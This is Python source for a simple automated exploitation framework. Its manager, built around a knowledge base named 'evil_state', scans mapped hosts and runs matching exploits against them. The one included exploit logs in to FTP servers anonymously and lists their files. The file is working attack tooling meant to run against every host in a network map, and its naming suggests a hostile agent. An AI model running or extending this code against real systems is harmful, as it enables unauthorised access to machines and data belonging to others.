import logging
from rich.console import Console
from rich.table import Table

# A (very) simple framework for exploits.
# In a real-world scenario, this would be much more complex, likely using a
# standardized library like Metasploit or similar.

class ExploitationManager:
    def __init__(self, evil_state, console=None):
        self.evil_state = evil_state
        self.console = console if console else Console()
        self.available_exploits = [
            AnonymousFTPLoginExploit()
        ]

    def find_and_run_exploits(self, target_ip=None):
        """
        Scans the knowledge base for potential vulnerabilities and attempts to run
        any matching exploits. If a target_ip is provided, only that host is targeted.
        Returns a string report of the actions taken.
        """
        output_lines = []
        network_map = self.evil_state["knowledge_base"]["network_map"]["hosts"]
        hosts_to_scan = {}
        if target_ip and target_ip in network_map:
            hosts_to_scan = {target_ip: network_map[target_ip]}
        elif not target_ip:
            hosts_to_scan = network_map

        if not hosts_to_scan:
            msg = "No known hosts to exploit."
            if target_ip:
                msg = f"Target IP {target_ip} not found in knowledge base."
            self.console.print(f"[yellow]{msg}[/yellow]")
            return msg

        output_lines.append(f"Starting exploitation phase against {len(hosts_to_scan)} target(s)...")
        self.console.print(f"[bold cyan]{output_lines[-1]}[/bold cyan]")

        exploits_found = 0
        for ip, host_data in hosts_to_scan.items():
            if not host_data.get("ports"):
                continue

            for exploit in self.available_exploits:
                if exploit.is_vulnerable(ip, host_data):
                    exploits_found += 1
                    success_msg = f"SUCCESS: Target {ip} is vulnerable to {exploit.name}."
                    output_lines.append(success_msg)
                    self.console.print(f"[bold green]{success_msg}[/bold green]")
                    try:
                        result = exploit.run(ip, host_data)
                        self._log_exploitation_result(ip, exploit.name, result)
                        result_str = f"  [+] Exploit successful. Result: {result}"
                        output_lines.append(result_str)
                        self.console.print(result_str)

                    except Exception as e:
                        fail_msg = f"  FAIL: Exploit failed with error: {e}"
                        output_lines.append(fail_msg)
                        self.console.print(f"[bold red]{fail_msg}[/bold red]")
                        logging.error(f"Exploit {exploit.name} failed against {ip}: {e}")

        if exploits_found == 0:
            output_lines.append("No vulnerabilities found for the targeted host(s).")

        return "\n".join(output_lines)

    def _log_exploitation_result(self, ip, exploit_name, result):
        """Logs the successful exploitation to the knowledge base."""
        if "exploits" not in self.evil_state["knowledge_base"]:
            self.evil_state["knowledge_base"]["exploits"] = {}
        if ip not in self.evil_state["knowledge_base"]["exploits"]:
            self.evil_state["knowledge_base"]["exploits"][ip] = []

        self.evil_state["knowledge_base"]["exploits"][ip].append({
            "exploit": exploit_name,
            "result": result
        })


class BaseExploit:
    """Base class for all exploits."""
    name = "Base Exploit"
    description = "This is a template."
    services = [] # List of services this exploit targets, e.g., ['ftp', 'vsftpd']

    def is_vulnerable(self, ip, host_data):
        """
        Checks if the target is vulnerable based on port scan data.
        This method should be overridden by subclasses.
        """
        raise NotImplementedError

    def run(self, ip, host_data):
        """
        Executes the exploit.
        This method should be overridden by subclasses.
        """
        raise NotImplementedError


class AnonymousFTPLoginExploit(BaseExploit):
    """
    Checks for and attempts to log into an FTP server with anonymous credentials.
    """
    name = "Anonymous FTP Login"
    description = "Tries to log in to an FTP server using 'anonymous' and 'anonymous' credentials."
    services = ['ftp']

    def is_vulnerable(self, ip, host_data):
        """
        Checks if port 21 is open and the service is identified as FTP.
        A more advanced check could look for specific banners.
        """
        for port, port_data in host_data.get("ports", {}).items():
            if port == "21" and port_data.get("service") == "ftp":
                # In a real scenario, you might check for banners indicating anonymous access is allowed.
                # For this PoC, we'll just try to connect.
                return True
        return False

    def run(self, ip, host_data):
        """
        Attempts to connect to the FTP server and list files.
        """
        import ftplib
        try:
            with ftplib.FTP(ip, timeout=5) as ftp:
                ftp.login('anonymous', 'anonymous')
                files = ftp.nlst()
                return {"status": "success", "files": files}
        except ftplib.all_errors as e:
            # This might happen if login is rejected, which is common.
            # We could make the `is_vulnerable` check more robust to avoid this.
            return {"status": "failed", "reason": str(e)}